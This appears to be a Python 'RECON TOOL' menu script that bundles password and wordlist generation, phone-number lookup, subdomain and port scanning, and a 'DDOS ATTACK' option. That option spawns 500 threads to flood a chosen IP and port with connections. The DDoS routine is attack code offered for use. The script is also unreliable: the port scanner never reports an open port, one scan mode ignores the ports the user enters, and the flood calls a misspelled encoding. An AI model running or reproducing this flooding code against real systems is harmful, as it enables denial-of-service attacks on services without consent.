import os 
import time
from tqdm import *
from pyfiglet import Figlet
import requests
import random
import itertools
import sys
import pyqrcode
from barcode import EAN13
from queue import Queue
import socket
import threading
from barcode.writer import ImageWriter
from pip._vendor.distlib.compat import raw_input
import pyfiglet
import phonenumbers
from phonenumbers import carrier
from phonenumbers import geocoder
from tabulate import tabulate

result=pyfiglet.figlet_format("RECON TOOL",font="slant")
print(result)

options = ("1- MY IP ADDRESS\n2- PASSWORD GENERATOR\n3- WORDLIST GENERATOR\n4- BARCODE GENERATOR\n5- QRCODE GENERATOR\n6- PHONE NUMBER INFO\n7- SUB-DOMAIN SCANNER\n8- PORT SCANNER\n9- DDOS ATTACK\n10- ADMIN PANEL FINDER\n")
print(options)

select = int(input("ENTER YOUR CHOICE "r""">>>>------->"""))

while select:
    # option 1
    if select == 1:
        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False,ncols=75):
                time.sleep(0.01)
            print("LOADING DONE!")
        def font(text):
            cool_text=Figlet(font="slant")
            return str(cool_text.renderText(text))
        def window_size(columns=800,height=100):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')
        
        if __name__=="__main__":
            window_size(80,20)
            print(font("FIND MY IP"))
            loading()

        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        print("YOUR DEVICE IS : "+IPAddr)
        print("YOUR IP ADDRESS IS : "+IPAddr)
        raw_input("PRESS ENTER TO EXIT")
        break
    
    # option 2
    elif select == 2:
        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False,ncols=75):
                time.sleep(0.01)
            print("LOADING DONE!")
        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))
        def window_size(columns=800,height=100):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')

        if __name__=="__main__":
            window_size(80,20)
            print(font("PASSWORD GENERATOR"))
            loading()
        
        length = int(input("ENTER THE LENGTH OF THE PASSWORD :"r""">>>>------->"""))

        def get_random_string(length):
            lower="abcdefghijklmnopqrstuvwxyz"
            upper="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            numbers="1234567890"
            symbols="@#&*(){}[]/?"
            all=lower+symbols+numbers+upper
            password="".join(random.sample(all,length))
            print("GENERATED PASSWORD OF LENGTH ",length," is "+r""">>>>------->"""+password)
            
        get_random_string(length)
        raw_input("PRESS ENTER TO EXIT")
        break

    # option 3
    elif select==3:
        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False,ncols=75):
                time.sleep(0.01)
            print("LOADING DONE!")
        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))
        def window_size(columns=800,height=100):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')

        if __name__=="__main__":
            window_size(80,20)
            print(font("WORDLIST GENERATOR"))
            loading()

        chrs=raw_input("ENTER THE LETTERS FOR THE COMBINATION "r""">>>>-------->""")
        l=int(raw_input("MINIMUM LENGTH OF PASSWORD "r""">>>>------->"""))
        k=l
        j=int(raw_input("MAXIMUM LENGTH OF PASSWORD "r""">>>>------->"""))
        n=j+1
        mtl=len(chrs)
        p=[]
        zt=raw_input("[+]ENTER THE NAME OF THE FILE"r""">>>>------->""")

        for ltp in range(k,n):
            ans=mtl**ltp
            p.append(ans)
            tline=sum(p)
        raw_input('ARE YOU READY ?[PRESS ENTER]')
        time1=time.asctime()
        start=time.time()

        psd=open(zt,'a')

        for i in range(k,n):
            r=i*100/n
            l=str(r)+'percent'
            sys.stdout.write("r%s" %1)
            sys.stdout.flush()
            psd.flush()

            for xs in itertools.product(chrs,repeat=i):
                psd.write(''.join(xs)+'\n')

        psd.flush()
        psd.close()
        sys.stdout.write("\DONE SUCCESS")
        end=time.time()
        '\t [+] Process completed       :   ',time.asctime()
        totaltime=end-start
        rate=tline/totaltime
        #print("GENERATED PASSWORD IS SAVED IN THE PRESENT FOLDER/DIRECTORY")

        raw_input("PRESS ENTER TO EXIT")
        break

    # option 4
    elif select==4:
        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False,ncols=75):
                time.sleep(0.01)
            print("LOADING DONE!")
        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))
        def window_size(columns=800,height=100):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')

        if __name__=="__main__":
            window_size(80,20)
            print(font("BARCODE GENERATOR"))
            loading()

        print("GENERATED BARCODE WILL BE SAVED AS PNG FILE IN THE PRESENT DIRECTORY")

        def generator(number):
            my_code=EAN13(number, writer = ImageWriter())
            my_code.save("bar_code")

        if __name__=="__main__":
            generator(input("ENTER 12 DIGIT NUMBER TO GENERATE BAR CODE"r""">>>>>------->"""))
            
        raw_input("PRESS ENTER TO EXIT")
        break
        
    # option 5
    elif select==5:
        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False,ncols=75):
                time.sleep(0.01)
            print("LOADING DONE!")
        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))
        def window_size(columns=800,height=100):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')

        if __name__=="__main__":
            window_size(80,20)
            print(font("QRCODE GENERATOR"))
            loading()

        print("GENERATED QRCODE WILL BE SAVED AS myqr.png IN THE PRESENT DIRECTORY")

        s=input("ENTER THE LINK TO CREATE A QRCODE "r""">>>>>------->""")
        url=pyqrcode.create(s)
        url.svg("myqr.svg",scale=8)
        url.png("myqr.png",scale=6)

        print("SUCCESS QRCODE GENERATED")
        
        raw_input("PRESS ENTER TO EXIT")
        break

    # option 6
    elif select==6:
        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False,ncols=75):
                time.sleep(0.01)
            print("LOADING DONE!")
        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))
        def window_size(columns=750,height=30):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')

        if __name__=="__main__":
            window_size(80,20)
            print(font("PHONE NUMBER SCANNER"))
            loading()

        def num_scanner(phn_num):
            number=phonenumbers.parse(phn_num)
            description=geocoder.description_for_number(number,'en')
            supplier = carrier.name_for_number(number,'en')
            info=[["country","SUPPLIER"],[description,supplier]]
            data = str(tabulate(info, headers="firstrow",tablefmt="github"))
            return data
        
        if __name__=="__main__":
            number=input("ENTER THE NUMBER"r""">>>>>------->""")
            print(num_scanner(number))

        raw_input("PRESS ENTER TO EXIT")
        break

    # option 7
    elif select==7:
        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False,ncols=75):
                time.sleep(0.01)
            print("LOADING DONE!")
        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))
        def window_size(columns=750,height=30):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')

        if __name__=="__main__":
            window_size(80,20)
            print(font("SUB-DOMAIN SCANNER"))
            loading()

        print("IT TAKES TIME ACCORDING TO THE DOMAIN")
        print("USINT DEFAULT ADDED WORDLIST WITH 649649 WORDS")

        domain=input("ENTER THE DOMAIN TO SCAN"r""">>>>>------->""")
        file=open("subdomain.txt")
        content=file.read()
        subdomains=content.splitlines()

        for subdomain in subdomains:
            url = f"https://{subdomain}.{domain}"
            try:
                requests.get(url)
                print("[+]DISCOVERED SUBDOMAIN: ",url)
            except requests.ConnectionError:
                print("[x]SUBDOMAIN NOT FOUND : ",url)
            
        raw_input("PRESS ENTER TO EXIT")
        break

    # option 8
    elif select==8:
        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False,ncols=75):
                time.sleep(0.01)
            print("LOADING DONE!")
        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))
        def window_size(columns=750,height=30):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')

        

        def port_scan(port):
            try:
                sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target,port))

            except :
                pass
            return False
            
        def get_ports(mode):
            if mode==1:
                for port in range(1,1024):
                    queue.put(port)
            elif mode==2:
                for port in range(1,49152):
                    queue.put(port)
            elif mode==3:
                ports=[20,21,22,23,25,53,80,110,443]
                for port in ports:
                    queue.put(port)
            elif mode==4:
                ports=input("ENTER YOUR PORTS (SEPERATE BY BLANK): ")
                ports = ports.split()
                ports = list(map(int,ports))
                for port in range(1,49152):
                    queue.put(port)

        def worker():
            while not queue.empty():
                port = queue.get()
                if port_scan(port):
                    print("Port {} is open!".format(port))
                    open_ports.append(port)

        def run_scanner(threads,mode):
            get_ports(mode)
            thread_list=[]

            for t in range(threads):
                thread = threading.Thread(target=worker)
                thread_list.append(thread)

            for thread in thread_list:
                thread.start()

            for thread in thread_list:
                thread.join()

        if __name__=="__main__":
            window_size(80,20)
            print(font("PORT SCANNER"))
            loading()

            print("KEEP SOME PATIENCE, IT TAKES TIME ACCORDING TO THE OPEN PORTS AND PROVIDED IP")
            target=raw_input("ENTER THE IP ADDRESS TO SCAN"r""">>>>>------->""")
            mode=int(input("ENTER PORT SCAN MODE : "))
            queue=Queue()
            open_ports=[]

            print("Open ports are : ",open_ports)
            run_scanner(100,mode)

        raw_input("PRESS ENTER TO EXIT")
        break

    # option 9
    elif select==9:
        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False,ncols=75):
                time.sleep(0.01)
            print("LOADING DONE!")
        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))
        def window_size(columns=750,height=30):
            os.system("cls")
            os.system(f'mode con: cols={columns} lines={height}')

        if __name__=="__main__":
            window_size(80,20)
            print(font("DDOS "))
            loading()

        target = raw_input("ENTER THE IP "r""">>>>>------>""")
        port=int(input("ENTER THE PORT "r""">>>>>------>"""))

        fake_ip = '181.4.20.196'

        already_Connnected=0

        def attack():
            while True:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
                s.sendto(("GET /"+ target + "HTTP/1.1\r\n").encode('asciii'),(target,port))
                s.sendto(("GET /"+ fake_ip + "HTTP/1.1\r\n").encode('asciii'),(target,port))
                s.close()

                global already_Connnected

                already_Connnected+=1
                if already_Connnected % 500 ==0:
                    print(already_Connnected)
                
        for i in range(500):
            thread = threading.Thread(target=attack)
            thread.start()
            
        raw_input("PRESS ENTER TO EXIT")
        break